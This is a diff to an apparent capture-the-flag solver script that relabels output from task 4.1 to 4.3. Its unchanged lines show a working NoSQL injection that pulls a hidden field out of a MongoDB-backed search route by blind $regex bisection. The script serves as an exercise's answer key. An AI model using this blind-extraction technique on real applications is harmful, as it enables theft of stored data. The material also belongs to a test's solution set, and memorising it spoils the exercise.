@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""solvers/p4_1.py, Task 4.1 "Basic Records Room" canonical exploit.
+"""solvers/p4_3.py, Task 4.3 "Basic Records Room" canonical exploit.
 
 The archive search route builds a MongoDB query directly out of raw
 request input:
@@ -113,7 +113,7 @@ def oracle(field: str, value) -> bool:
 
 
 def step0_confirm_type_confusion() -> None:
-    print("[p4_1] step 0, confirm the search oracle + real type confusion")
+    print("[p4_3] step 0, confirm the search oracle + real type confusion")
 
     ok = oracle(PUBLIC_FIELD, PUBLIC_VALUE)
     print(f"  {PUBLIC_FIELD}={PUBLIC_VALUE!r} (plain string) -> matched={ok}")
@@ -148,7 +148,7 @@ def step0_confirm_type_confusion() -> None:
 
 
 def step1_confirm_hidden_field() -> None:
-    print(f"[p4_1] step 1, confirm hidden field {FLAG_FIELD!r} exists and starts with SEIYAKU")
+    print(f"[p4_3] step 1, confirm hidden field {FLAG_FIELD!r} exists and starts with SEIYAKU")
     ok = oracle(FLAG_FIELD, {"$regex": "^SEIYAKU"})
     print(f"  {FLAG_FIELD}[$regex]='^SEIYAKU' -> matched={ok}")
     if not ok:
@@ -157,7 +157,7 @@ def step1_confirm_hidden_field() -> None:
 
 
 def step2_discover_length() -> int:
-    print(f"[p4_1] step 2, binary-search LENGTH({FLAG_FIELD}) via $regex")
+    print(f"[p4_3] step 2, binary-search LENGTH({FLAG_FIELD}) via $regex")
     lo, hi = 0, MAX_LEN
     while lo < hi:
         mid = (lo + hi) // 2
@@ -173,7 +173,7 @@ def step2_discover_length() -> int:
 
 
 def step3_discover_value(length: int) -> str:
-    print(f"[p4_1] step 3, walk {FLAG_FIELD} char-by-char via $regex character-class bisection")
+    print(f"[p4_3] step 3, walk {FLAG_FIELD} char-by-char via $regex character-class bisection")
     prefix = ""
     for position in range(1, length + 1):
         lo, hi = ASCII_LOW, ASCII_HIGH
@@ -192,7 +192,7 @@ def step3_discover_value(length: int) -> str:
 
 
 def step4_cross_validate(value: str) -> None:
-    print(f"[p4_1] step 4, cross-validate recovered value via $gt/$lt/$eq bracketing")
+    print(f"[p4_3] step 4, cross-validate recovered value via $gt/$lt/$eq bracketing")
 
     eq_ok = oracle(FLAG_FIELD, {"$eq": value})
     print(f"  {FLAG_FIELD}[$eq]={value!r} -> matched={eq_ok}")
@@ -215,7 +215,7 @@ def step4_cross_validate(value: str) -> None:
 
 
 def main() -> int:
-    print(f"[p4_1] target: {ROUTE}")
+    print(f"[p4_3] target: {ROUTE}")
     try:
         step0_confirm_type_confusion()
         step1_confirm_hidden_field()
@@ -226,20 +226,20 @@ def main() -> int:
         step4_cross_validate(value)
     except Exception as exc:
         print(f"  FAIL: {exc}")
-        print("[p4_1] FAIL")
+        print("[p4_3] FAIL")
         return 1
 
-    print(f"[p4_1] recovered value: {value}")
+    print(f"[p4_3] recovered value: {value}")
 
     if value != EXPECTED_FLAG:
         print("  FAIL: recovered value does not match expected flag")
         print(f"  expected: {EXPECTED_FLAG}")
         print(f"  got:      {value}")
-        print("[p4_1] FAIL")
+        print("[p4_3] FAIL")
         return 1
 
     print(f"  ok: recovered flag matches: {EXPECTED_FLAG}")
-    print("[p4_1] PASS")
+    print("[p4_3] PASS")
     return 0
 
 
